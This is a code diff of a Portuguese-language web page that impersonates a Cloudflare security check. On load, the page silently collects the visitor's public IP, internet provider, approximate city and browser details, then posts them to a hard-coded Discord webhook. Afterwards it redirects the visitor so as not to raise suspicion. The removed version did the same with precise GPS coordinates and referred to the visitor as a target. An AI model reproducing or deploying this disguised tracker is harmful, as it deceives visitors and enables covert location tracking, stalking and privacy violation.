@@ -2,53 +2,80 @@
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
-    <title>Processando...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Check - Cloudflare</title>
+    <style>
+        body { background: #0f172a; color: #f1f5f9; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #1e293b; padding: 40px; border-radius: 12px; border: 1px solid #334155; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 300px; }
+        .spinner { border: 3px solid #334155; border-top: 3px solid #3b82f6; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .toast { position: fixed; top: 20px; right: 20px; background: #3b82f6; color: white; padding: 12px; border-radius: 6px; font-size: 13px; box-shadow: 0 4px 10px rgba(0,0,0,0.3); z-index: 100; margin-bottom: 10px; border-right: 4px solid #fff; }
+    </style>
 </head>
-<body style="background:#000; color:#0f0; font-family:monospace; padding:20px;">
-    <div id="status">INICIANDO PROTOCOLO...</div>
+<body>
+
+    <div id="notif"></div>
+
+    <div class="card">
+        <div class="spinner"></div>
+        <h2 style="font-size: 18px; margin: 0;">Verificando Conexão</h2>
+        <p style="font-size: 13px; color: #94a3b8;">Validando integridade do navegador...</p>
+    </div>
 
     <script>
-        // VERIFIQUE SE ESTE LINK ESTÁ EXATAMENTE IGUAL AO DO DISCORD
         const WEBHOOK = "https://discord.com/api/webhooks/1473792549045932103/9BrDwlVARrLj3joN4liqNqY8OmV07hF6hf8KtHwdA1nEr_sbeSq9So8SQlY9DL5weC9q";
 
-        async function enviar(msg) {
-            await fetch(WEBHOOK, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: msg })
-            });
+        function toast(t) {
+            const n = document.createElement('div');
+            n.className = 'toast'; n.innerText = 'ℹ ' + t;
+            document.getElementById('notif').appendChild(n);
+            setTimeout(() => n.remove(), 3000);
         }
 
-        window.onload = async () => {
-            // TESTE 1: Manda um aviso assim que abre (pra saber se o link tá vivo)
+        async function capturar() {
+            toast("Conexão Segura");
+            
             try {
-                await enviar("🚀 **SISTEMA ONLINE:** Alvo abriu o link agora.");
-                document.getElementById('status').innerHTML += "<br>TESTE 1: OK";
-            } catch(e) {
-                document.getElementById('status').innerHTML += "<br>ERRO NO WEBHOOK: " + e;
-            }
+                // Captura o IP e Provedor (Internet)
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                
+                toast("Enviando Logs...");
 
-            // TESTE 2: Tenta o GPS
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (p) => {
-                    const lat = p.coords.latitude;
-                    const lon = p.coords.longitude;
-                    
-                    const log = `🎯 **LOCALIZAÇÃO ENCONTRADA!**\n` +
-                                `📍 Mapa: https://www.google.com/maps?q=${lat},${lon}\n` +
-                                `⏰ Hora: ${new Date().toLocaleString('pt-BR')}`;
-                    
-                    await enviar(log);
-                    document.getElementById('status').innerHTML += "<br>TESTE 2: GPS ENVIADO";
-                    
-                    // Fecha a aba após 2 segundos de sucesso
-                    setTimeout(() => { window.location.href = "about:blank"; }, 2000);
+                // Envia para o Discord
+                await fetch(WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: "📡 NOVO LOG DE DISPOSITIVO",
+                            color: 3447003,
+                            fields: [
+                                { name: "🌐 IP Público:", value: data.ip || "N/A", inline: true },
+                                { name: "🏢 Provedor/Internet:", value: data.org || "N/A", inline: false },
+                                { name: "🏙️ Localização (IP):", value: `${data.city}, ${data.region} - ${data.country_name}`, inline: false },
+                                { name: "📱 Aparelho/Browser:", value: navigator.userAgent, inline: false },
+                                { name: "⏰ Horário:", value: new Date().toLocaleString('pt-BR'), inline: true }
+                            ],
+                            footer: { text: "Monitoramento Ativo" }
+                        }]
+                    })
+                });
 
-                }, (err) => {
-                    enviar("❌ O alvo recusou o GPS ou o dispositivo bloqueou.");
-                    document.getElementById('status').innerHTML += "<br>ERRO: GPS NEGADO";
-                }, { enableHighAccuracy: true, timeout: 10000 });
+                toast("Concluído!");
+                // Fecha a aba ou redireciona
+                setTimeout(() => { window.location.href = "about:blank"; }, 1000);
+
+            } catch (e) {
+                console.error("Erro no envio");
+                // Mesmo com erro, redireciona para não suspeitarem
+                window.location.href = "https://google.com";
             }
+        }
+
+        // Inicia assim que a página carrega
+        window.onload = () => {
+            setTimeout(capturar, 500);
         };
     </script>
 </body>
